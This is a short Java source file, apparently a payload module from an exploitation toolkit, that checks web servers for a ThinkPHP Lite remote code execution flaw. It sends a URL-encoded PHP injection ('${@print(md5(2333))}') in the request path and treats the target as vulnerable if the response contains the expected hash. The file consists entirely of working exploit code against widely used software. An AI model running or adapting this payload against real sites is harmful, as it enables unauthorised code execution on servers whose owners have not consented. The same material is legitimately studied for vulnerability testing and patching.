package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_lite_code_exec implements BasePayload {
    private static final String CheckStr="56540676a129760a3";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result = HttpTool.getHttpReuest(url + "/index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D", "utf-8");
            if(test_result.contains(CheckStr)){
                return true;}

        }catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}